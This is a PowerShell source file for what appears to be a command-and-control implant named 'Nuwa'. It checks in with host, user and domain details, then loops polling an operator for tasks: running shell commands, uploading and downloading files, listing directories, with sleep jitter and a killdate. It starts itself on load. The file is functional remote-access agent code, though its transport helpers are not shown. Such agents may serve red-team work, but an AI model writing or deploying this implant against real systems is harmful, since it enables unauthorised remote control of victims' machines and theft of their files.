function Write-NuwaDebug {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message
    )

    if ($script:NuwaConfig.DebugLogging) {
        Write-Host "[Status] $Message"
    }
}

function Resolve-NuwaPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ($Path -match '^[A-Za-z]:[\\/]') {
        return $Path
    }

    if ($Path.StartsWith('\\')) {
        return $Path
    }

    Push-Location -LiteralPath $script:NuwaState.CurrentDirectory
    try {
        if (Test-Path -LiteralPath $Path) {
            return (Get-Item -LiteralPath $Path -Force).FullName
        }
        return (Join-Path -Path $script:NuwaState.CurrentDirectory -ChildPath $Path)
    } finally {
        Pop-Location
    }
}

function ConvertFrom-NuwaJsonObject {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]$Value
    )

    if ([string]::IsNullOrWhiteSpace($Value)) {
        return $null
    }
    $parsed = $Value | ConvertFrom-Json -ErrorAction Stop
    return (ConvertFrom-NuwaAgentJsonValue -Value $parsed)
}

function Invoke-NuwaSendMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [int]$Action,

        [Parameter(Mandatory = $false)]
        [hashtable]$Body = @{}
    )

    $message = @{}
    foreach ($key in $Body.Keys) {
        $message[$key] = $Body[$key]
    }
    $message[$script:NuwaF_action] = $Action
    $message = Add-NuwaMessageMetadata -Message $message

    [byte[]]$wireBody = ConvertTo-NuwaWireBytes -Message $message -Context @{}
    Write-NuwaDebug ("Sending action {0} for {1}" -f $Action, $Uuid)
    $rawResponse = Invoke-NuwaTransport -Uuid $Uuid -Action $Action -WireBody $wireBody
    if ($null -eq $rawResponse -or ([byte[]]$rawResponse).Length -eq 0) {
        Write-NuwaDebug ("No transport response for action {0} on {1}" -f $Action, $Uuid)
        return $null
    }

    $decodedJson = ConvertFrom-NuwaResponseBody `
        -ResponseBody $rawResponse `
        -ExpectedUuid $Uuid `
        -UuidLength $script:NuwaConfig.MessageUuidLength `
        -Context @{}
    Write-NuwaDebug ("Received response for action {0} ({1} characters)" -f $Action, $decodedJson.Length)
    return (ConvertFrom-NuwaJsonObject -Value $decodedJson)
}

function Invoke-NuwaUpdateInfo {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [object]$SleepInfo,

        [Parameter(Mandatory = $false)]
        [string]$Cwd
    )

    if ([string]::IsNullOrWhiteSpace($script:NuwaState.CallbackUUID)) {
        return
    }

    $body = @{}
    if ($null -ne $SleepInfo) {
        $body[$script:NuwaF_sleep_info] = $SleepInfo
    }
    if (-not [string]::IsNullOrWhiteSpace($Cwd)) {
        $body[$script:NuwaF_cwd] = $Cwd
    }
    if ($body.Count -eq 0) {
        return
    }
    [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action $script:NuwaA_update_info -Body $body)
}

function Get-NuwaCheckinMessage {
    [CmdletBinding()]
    param()

    $osValue = if ($env:OS) { [string]$env:OS } else { $script:NuwaH_Windows }
    $architecture = if ($env:PROCESSOR_ARCHITECTURE -match '64') { $script:NuwaH_x64 } else { $script:NuwaH_x86 }
    $result = @{}
    $result[$script:NuwaF_ip] = ''
    $result[$script:NuwaF_os] = $osValue
    $result[$script:NuwaF_user] = Invoke-NuwaWhoami
    $result[$script:NuwaF_host] = Invoke-NuwaHostname
    $result[$script:NuwaF_domain] = $env:USERDOMAIN
    $result[$script:NuwaF_pid] = $PID
    $result[$script:NuwaF_uuid] = $script:NuwaConfig.PayloadUUID
    $result[$script:NuwaF_architecture] = $architecture
    $result[$script:NuwaF_cwd] = $script:NuwaState.CurrentDirectory
    return $result
}

function Invoke-NuwaCheckin {
    [CmdletBinding()]
    param()

    $retryDelaySeconds = [int]$script:NuwaConfig.CallbackInterval
    if ($retryDelaySeconds -lt 1) {
        $retryDelaySeconds = 1
    }

    for ($attempt = 1; $attempt -le 3; $attempt += 1) {
        $response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action $script:NuwaA_checkin -Body (Get-NuwaCheckinMessage)
        if ($null -ne $response -and $response[$script:NuwaF_id]) {
            $script:NuwaState.CallbackUUID = [string]$response[$script:NuwaF_id]
            Write-NuwaDebug "Checked in as $($script:NuwaState.CallbackUUID)"
            return
        }

        Write-NuwaDebug ("Checkin attempt {0}/3 returned no callback id" -f $attempt)
        if ($attempt -lt 3) {
            Start-Sleep -Seconds $retryDelaySeconds
        }
    }

    throw 'Checkin failed after 3 attempts'
}

function ConvertTo-NuwaCommandParameters {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [int]$CommandName,

        [Parameter(Mandatory = $false)]
        [object]$RawParameters
    )

    if ($RawParameters -is [System.Collections.IDictionary]) {
        if (-not $RawParameters.ContainsKey($script:NuwaQ_raw_text)) {
            return $RawParameters
        }
        $rawText = [string]$RawParameters[$script:NuwaQ_raw_text]
    } else {
        $rawText = [string]$RawParameters
    }

    if ([string]::IsNullOrWhiteSpace($rawText)) { return @{} }
    if ($CommandName -eq $script:NuwaC_shell) {
        $result = @{}
        $result[$script:NuwaQ_command] = $rawText
        return $result
    }
    if ($CommandName -eq $script:NuwaC_download -or $CommandName -eq $script:NuwaC_cd -or
        $CommandName -eq $script:NuwaC_ls) {
        $result = @{}
        $result[$script:NuwaQ_path] = $rawText
        return $result
    }
    return @{}
}

function Invoke-NuwaTask {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Task
    )

    $commandCode = [int]$Task[$script:NuwaF_command]
    $taskId = [string]$Task[$script:NuwaF_id]
    $response = @{}
    $response[$script:NuwaF_task_id] = $taskId
    $response[$script:NuwaF_completed] = $true
    Write-NuwaDebug ("Starting task {0} ({1})" -f $taskId, $commandCode)

    try {
        $parameters = ConvertTo-NuwaCommandParameters -CommandName $commandCode -RawParameters $Task[$script:NuwaF_parameters]
        if ($commandCode -eq $script:NuwaC_sleep) {
                $sleepInfo = Invoke-NuwaSleep -Parameters $parameters
                $response[$script:NuwaF_user_output] = New-NuwaDiagnosticOutput -Code 1045
                Invoke-NuwaUpdateInfo -SleepInfo $sleepInfo
        } elseif ($commandCode -eq $script:NuwaC_cd) {
                $newCwd = Invoke-NuwaCd -Parameters $parameters
                $response[$script:NuwaF_user_output] = $newCwd
                Invoke-NuwaUpdateInfo -Cwd $newCwd
        } elseif ($commandCode -eq $script:NuwaC_whoami) {
            $whoami = Invoke-NuwaWhoami
            $response[$script:NuwaF_user_output] = if ($whoami -is [int] -and $whoami -eq $script:NuwaH_unknown) {
                New-NuwaDiagnosticOutput -Code 1084
            } else { $whoami }
        } elseif ($commandCode -eq $script:NuwaC_hostname) {
            $hostname = Invoke-NuwaHostname
            $response[$script:NuwaF_user_output] = if ($hostname -is [int] -and $hostname -eq $script:NuwaH_unknown_host) {
                New-NuwaDiagnosticOutput -Code 1085
            } else { $hostname }
        } elseif ($commandCode -eq $script:NuwaC_exit) {
            $response[$script:NuwaF_user_output] = Invoke-NuwaExit
        } elseif ($commandCode -eq $script:NuwaC_ls) {
            $response[$script:NuwaF_user_output] = Invoke-NuwaLs -Parameters $parameters
        } elseif ($commandCode -eq $script:NuwaC_shell) {
                $shellResult = Invoke-NuwaShell -Parameters $parameters
                $response[$script:NuwaF_user_output] = $shellResult[$script:NuwaF_user_output]
                $response[$script:NuwaF_process_response] = $shellResult[$script:NuwaF_process_response]
        } elseif ($commandCode -eq $script:NuwaC_upload) {
                $uploadResponse = Invoke-NuwaUpload -TaskId $taskId -Parameters $parameters
                foreach ($key in $uploadResponse.Keys) {
                    $response[$key] = $uploadResponse[$key]
                }
        } elseif ($commandCode -eq $script:NuwaC_download) {
            $response[$script:NuwaF_user_output] = Invoke-NuwaDownload -TaskId $taskId -Parameters $parameters
        } else {
            throw ("Unsupported command code {0}" -f $commandCode)
        }
    } catch {
        # NUWA_TASK_ERROR_BEGIN
        $diagnostic = $_.TargetObject
        if ($diagnostic -is [object[]] -and $diagnostic.Length -eq 4 -and
            $diagnostic[0] -is [int] -and $diagnostic[0] -eq 20053 -and
            $diagnostic[1] -is [int] -and $diagnostic[1] -eq 1) {
            $response[$script:NuwaF_user_output] = $diagnostic
        } else {
            $response[$script:NuwaF_user_output] = ($_ | Out-String).TrimEnd()
        }
        # NUWA_TASK_ERROR_END
        $response[$script:NuwaF_status] = $script:NuwaS_error
        Write-NuwaDebug ("Task {0} raised {1}" -f $taskId, ($_ | Out-String).TrimEnd())
    }

    $responseStatus = if ($response.ContainsKey($script:NuwaF_status)) {
        [int]$response[$script:NuwaF_status]
    } else { $script:NuwaS_success }
    Write-NuwaDebug ("Completed task {0} with status {1}" -f $taskId, $responseStatus)

    return $response
}

function Invoke-NuwaTaskLoop {
    [CmdletBinding()]
    param()

    if ($null -eq $script:NuwaCompletedTaskResponses) {
        $script:NuwaCompletedTaskResponses = @{}
    }
    if ($null -eq $script:NuwaCompletedTaskIds) {
        $script:NuwaCompletedTaskIds = @()
    }

    while (-not $script:NuwaState.ExitRequested) {
        if (Test-NuwaKilldatePassed -Killdate $script:NuwaConfig.Killdate) {
            break
        }

        $request = @{}
        $request[$script:NuwaF_tasking_size] = -1
        $tasking = Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action $script:NuwaA_get_tasking -Body $request
        $tasks = if ($null -ne $tasking) { $tasking[$script:NuwaF_tasks] } else { $null }
        if ($null -ne $tasks -and @($tasks).Count -gt 0) {
            Write-NuwaDebug ("Received {0} task(s)" -f @($tasks).Count)
            foreach ($task in @($tasks)) {
                $taskId = [string]$task[$script:NuwaF_id]
                if (
                    -not [string]::IsNullOrWhiteSpace($taskId) -and
                    $script:NuwaCompletedTaskResponses.ContainsKey($taskId)
                ) {
                    $response = $script:NuwaCompletedTaskResponses[$taskId]
                    Write-NuwaDebug ("Reusing completed response for duplicate task {0}" -f $taskId)
                } else {
                    $response = Invoke-NuwaTask -Task $task
                    if (-not [string]::IsNullOrWhiteSpace($taskId)) {
                        $maximumCompletedTasks = 256
                        if ($script:NuwaCompletedTaskIds.Count -ge $maximumCompletedTasks) {
                            $oldestTaskId = [string]$script:NuwaCompletedTaskIds[0]
                            [void]$script:NuwaCompletedTaskResponses.Remove($oldestTaskId)
                            if ($script:NuwaCompletedTaskIds.Count -eq 1) {
                                $script:NuwaCompletedTaskIds = @()
                            } else {
                                $script:NuwaCompletedTaskIds = @(
                                    $script:NuwaCompletedTaskIds[1..($script:NuwaCompletedTaskIds.Count - 1)]
                                )
                            }
                        }
                        $script:NuwaCompletedTaskResponses[$taskId] = $response
                        $script:NuwaCompletedTaskIds += $taskId
                    }
                }
                Write-NuwaDebug ("Sending post_response for task {0}" -f $taskId)
                $responseBody = @{}
                $responseBody[$script:NuwaF_responses] = @($response)
                [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action $script:NuwaA_post_response -Body $responseBody)
                if ($script:NuwaState.ExitRequested) {
                    break
                }
            }
        }

        $sleepMilliseconds = [int]((Get-NuwaSleepDurationSeconds -Interval $script:NuwaConfig.CallbackInterval -Jitter $script:NuwaConfig.CallbackJitter) * 1000)
        if ($sleepMilliseconds -lt 0) {
            $sleepMilliseconds = 0
        }
        Start-Sleep -Milliseconds $sleepMilliseconds
    }
}

function Start-Nuwa {
    [CmdletBinding()]
    param()

    $script:NuwaState.CurrentDirectory = (Get-Location).ProviderPath
    $script:NuwaCompletedTaskResponses = @{}
    $script:NuwaCompletedTaskIds = @()
    Invoke-NuwaCheckin
    Invoke-NuwaTaskLoop
}

Start-Nuwa
